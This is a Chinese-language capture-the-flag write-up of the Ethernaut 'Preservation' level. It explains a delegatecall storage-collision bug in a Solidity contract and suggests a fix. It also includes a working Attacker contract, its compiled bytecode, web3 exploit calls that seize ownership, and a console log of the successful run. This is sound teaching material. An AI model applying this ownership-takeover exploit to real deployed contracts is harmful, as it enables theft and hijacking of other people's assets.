# 17 Preservation


## 思路
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

目标: 将合约的owner变成player



### 合约存在的bug

这个合约的实现本身有bug: 

```js
    let lib1AddressBefore = await preservation.timeZone1Library();
    await preservation.setFirstTime(1)
    let lib1AddressAfter = await preservation.timeZone1Library();
    console.log("lib1AddressBefore:", lib1AddressBefore)
    console.log("lib1AddressAfter :", lib1AddressAfter)
```

输出:

```
lib1AddressBefore: 0x6A699Bb8ad1da8643B3210559C76f07eecb7CeA5
lib1AddressAfter : 0x0000000000000000000000000000000000000001
```

为什么会这样?

第一:   `delegatecall`使用的是caller的上下文

第二: `LibraryContract`代码中`setTime`函数的实际含义是什么:
反编译一下 `LibraryContract`: 得到

```solidity
def storage:
  stor0 is uint256 at storage 0

def _fallback() payable: # default function
  revert

def setTime(uint256 _param1) payable:
  require calldata.size - 4 >=′ 32
  require _param1 == _param1
  stor0 = _param1
```

setTime的含义是: 将合约的slot0的值设置为函数参数

那么问题就出现了, 当对`setTime`使用`delegatecall`时, 其slot0就是caller的slot0, 也就是 `Preservation`合约的`timeZone1Library`变量

> 注: 要解决掉这个bug, 可以将
>
> ```solidity
>   address public timeZone1Library;
>   address public timeZone2Library;
>   address public owner; 
>   uint storedTime;
> ```
>
> 修改为
>
> ```solidity
> 	uint storedTime;
> 	address public timeZone1Library;
>   address public timeZone2Library;
>   address public owner; 
> 
> ```



### 修改owner

假设我们的工具代码在合约`Attacker`中, 可以利用上面的bug, 调用一次`setFirstTime`函数 将`timeZone1Library`的值修改为`Attacker`的地址, 然后再调用一次`setFirstTime`执行`Attacker`中的攻击代码

```js
//将 timeZone1Library 修改为 attacker._address
await preservation.setFirstTime(attacker._address);

//setFirstTime使用timeZone1Library(attacker._address)进行delegatecall, 使用preservation的上下文执行attacker上的setTime()函数代码, 然后我们在attacker上的setTime()函数中修改owner
await preservation.setFirstTime(1);
```

```solidity
contract Attacker {
    function setTime(uint256 _time) public {
        assembly {
            //please replace this address to your player address.
            //owner变量在Preservation合约的slot2处
            sstore(2, 0xD320e0772f6c8644BD6dc9AF805b1132ca0F6D05)
        }
    }
}
```



## 答案

```js
let abi = [{"inputs":[{"internalType":"uint256","name":"_time","type":"uint256"}],"name":"setTime","outputs":[],"stateMutability":"nonpayable","type":"function"}]

let byteCode = "0x" +
        "608060405234801561001057600080fd5b5060f48061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80633beb26c414602d575b600080fd5b60436004803603810190603f91906096565b6045565b005b73d320e0772f6c8644bd6dc9af805b1132ca0f6d0560025550565b600080fd5b6000819050919050565b6076816065565b8114608057600080fd5b50565b600081359050609081606f565b92915050565b60006020828403121560a95760a86060565b5b600060b5848285016083565b9150509291505056fea2646970667358221220f48d52eb924ef1be14615c0fbb3e727ff318dce14f1a66b1664263acb97c3a0364736f6c63430008110033"


//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});

await contract.setFirstTime(myInstance._address);
await contract.setFirstTime(1);
```

> 注: 实例化挑战是 player地址可能不一样, 修改`Attacker`合约重新生成并替换`byteCode`



## 参考过程

```
^^.js:45 龴ↀ◡ↀ龴 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:10:38.479
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xd555709f9b6e384138a3f22385558ba8b4bdde4df936c6c75a15a050cafffa60
^^.js:35 => 实例地址0x36Fc5028BdEd2b91d166BF95123E7e3a4EC1bc88
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:10:43.759
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xd555709f9b6e384138a3f22385558ba8b4bdde4df936c6c75a15a050cafffa60
redux-logger.js:1  action SET_BLOCK_NUM @ 16:10:52.927


let abi = [{"inputs":[{"internalType":"uint256","name":"_time","type":"uint256"}],"name":"setTime","outputs":[],"stateMutability":"nonpayable","type":"function"}]

let byteCode = "0x" +
        "608060405234801561001057600080fd5b5060f48061001f6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c80633beb26c414602d575b600080fd5b60436004803603810190603f91906096565b6045565b005b73d320e0772f6c8644bd6dc9af805b1132ca0f6d0560025550565b600080fd5b6000819050919050565b6076816065565b8114608057600080fd5b50565b600081359050609081606f565b92915050565b60006020828403121560a95760a86060565b5b600060b5848285016083565b9150509291505056fea2646970667358221220f48d52eb924ef1be14615c0fbb3e727ff318dce14f1a66b1664263acb97c3a0364736f6c63430008110033"


//deploy it
let myContract = new web3.eth.Contract(abi);
let deploy = myContract.deploy({
	data: byteCode,
	arguments: []
});
let myInstance = await deploy.send({
	from: player
});

await contract.setFirstTime(myInstance._address);
await contract.setFirstTime(1);


^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xffcf7f370af151fed039a75733a93c5a52d2ada2271240d450d0f6c165f85198
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xffcf7f370af151fed039a75733a93c5a52d2ada2271240d450d0f6c165f85198
redux-logger.js:1  action SET_BLOCK_NUM @ 16:11:12.935
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x1880a4f76397f66464869fcef3d9e15317735edcdb30fd87ed57cd6c8f2e0283
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x1880a4f76397f66464869fcef3d9e15317735edcdb30fd87ed57cd6c8f2e0283
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x0e09ed8d9ee16e0bae4bf8623a8c0f3523c33ab1bc1ffdb91bcdf910b78661ba
{tx: "0x0e09ed8d9ee16e0bae4bf8623a8c0f3523c33ab1bc1ffdb91bcdf910b78661ba", receipt: {…}, logs: Array(0)}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x0e09ed8d9ee16e0bae4bf8623a8c0f3523c33ab1bc1ffdb91bcdf910b78661ba
redux-logger.js:1  action SET_BLOCK_NUM @ 16:11:22.874
^^.js:45 | – _ – | 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:11:30.507
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x59a442b05d5a448960442e2f1adbbcbadda1a00e61ab3f87da03b0ffb654e106
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x59a442b05d5a448960442e2f1adbbcbadda1a00e61ab3f87da03b0ffb654e106
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:73 =^..^= 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:11:42.874

```

